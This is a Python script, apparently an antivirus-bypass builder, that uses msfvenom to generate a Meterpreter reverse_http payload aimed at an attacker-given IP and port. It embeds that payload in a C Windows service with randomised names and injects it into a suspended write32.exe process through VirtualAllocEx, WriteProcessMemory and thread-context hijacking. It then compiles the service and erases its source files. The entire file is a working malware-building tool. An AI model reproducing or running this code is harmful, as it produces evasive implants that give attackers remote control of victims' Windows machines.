#!/usr/bin/env python
# coding: latin-1
import re, os, sys, socket, struct, commands, subprocess, functools, random, string
#Techryptic.github.io
#---------------#---------#
W  = '\033[0m'  # White   #
G  = '\033[32m' # Green   #
Y  = '\033[33m' # Yellow  #
R  = '\033[91m' # RED     #
#---------------#---------#
ExecutableName = "write32.exe"

if len(sys.argv) is not 3:
    print "Usage: {0} IP PORT".format(sys.argv[0])
    print "IP & PORT can either be for CoboltStike or Meterpreter"
    print "Default Exectuable Name: "+ExecutableName
    exit()
ip = sys.argv[1]
port = sys.argv[2]

header = """
 █████╗ ██╗   ██╗       ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔══██╗██║   ██║       ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║██║   ██║       ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██╔══██║╚██╗ ██╔╝       ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
██║  ██║ ╚████╔╝███████╗██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚═╝  ╚═╝  ╚═══╝ ╚══════╝╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝"""
print(header.decode('utf-8'))

try:
    is_present=subprocess.check_output(['which','i686-w64-mingw32-gcc'],stderr=subprocess.STDOUT)
except subprocess.CalledProcessError: 
    print(R+"i686-w64-mingw32-gcc"+" is not installed\n"+W)
    exit()
try:
    is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
except subprocess.CalledProcessError: 
    print(R+"msfvenom"+" is not installed\n"+W)
    exit()

print "█ "+G+"Setting up MSFVENOM"+W+"..."+W

msf = commands.getstatusoutput('msfvenom -p windows/meterpreter/reverse_http LHOST='+ip+' LPORT='+port+' -f c > payload.c')
print "█ "+G+"Payload Generated"+W+"..."+W
msf = str(msf)
if 'Payload size' in msf:
	bytes = re.findall(r'Payload size: (.*?) bytes', msf)
	bytes = int(bytes[0]) + 2
print "█ "+G+"Payload Size: "+W+""+str(bytes)+W

payload = commands.getstatusoutput('cat payload.c | grep x')

rand = "".join( [random.choice(string.letters[:26]) for i in xrange(5)] )
randservicename = "".join( [random.choice(string.letters[:26]) for i in xrange(8)] )
randbuff = "".join( [random.choice(string.letters[:26]) for i in xrange(4)] )
randlpPayload = "".join( [random.choice(string.letters[:26]) for i in xrange(9)] )
randdate = "b"+"".join( [random.choice(string.letters[:26]) for i in xrange(4)] )

print "█ "+G+"Injecting Payload"+W+"..."+W
s = """#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define """+randbuff+"""	"""+str(bytes)+"""
char cServiceName[32] = """+"\""+randservicename+"\""+""";
char """+randdate+"""["""+randbuff+"""] = """+payload[1]+"""

SERVICE_STATUS """+rand+""";
SERVICE_STATUS_HANDLE hStatus = NULL;

BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		"""+rand+""".dwWin32ExitCode = 0;
		"""+rand+""".dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &"""+rand+""" );
}
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID """+randlpPayload+""" = NULL;
	ZeroMemory( &"""+rand+""", sizeof(SERVICE_STATUS) );
	ZeroMemory( &si, sizeof(STARTUPINFO) );
	ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
	si.cb = sizeof(STARTUPINFO);
	"""+rand+""".dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	"""+rand+""".dwCurrentState = SERVICE_START_PENDING;
	"""+rand+""".dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
	if ( hStatus )
	{
		"""+rand+""".dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( hStatus, &"""+rand+""" );
		if( CreateProcess( NULL, """+"\""+ExecutableName+"\""+""", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;
			GetThreadContext( pi.hThread, &Context );
			"""+randlpPayload+""" = VirtualAllocEx( pi.hProcess, NULL, """+randbuff+""", MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( """+randlpPayload+""" )
			{
				WriteProcessMemory( pi.hProcess, """+randlpPayload+""", &"""+randdate+""", """+randbuff+""", NULL );
#ifdef _WIN64
				Context.Rip = (DWORD64)"""+randlpPayload+""";
#else
				Context.Eip = (DWORD)"""+randlpPayload+""";
#endif
				SetThreadContext( pi.hThread, &Context );
			}
			ResumeThread( pi.hThread );
			CloseHandle( pi.hThread );
			CloseHandle( pi.hProcess );
		}
		ServiceHandler( SERVICE_CONTROL_STOP );
		ExitProcess( 0 );
	}
}
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	SERVICE_TABLE_ENTRY st[] = 
    { 
        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain }, 
        { NULL, NULL } 
    };
	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
}
"""
print "█ "+G+"Writing to C File"+W+"..."+W
fout = open("wrap.c", "w")
fout.write(s)
fout.close()

print "█ "+G+"Compiling Windows Service Executable..:"+W+" "+ExecutableName+W
os.system("i686-w64-mingw32-gcc wrap.c -o "+ExecutableName)

print "█ "+G+"Cleaning up"+W+"..."+W
os.system("rm wrap.c | rm payload.c")
print "█ "+G+"FINISHED"+W+"..."+W
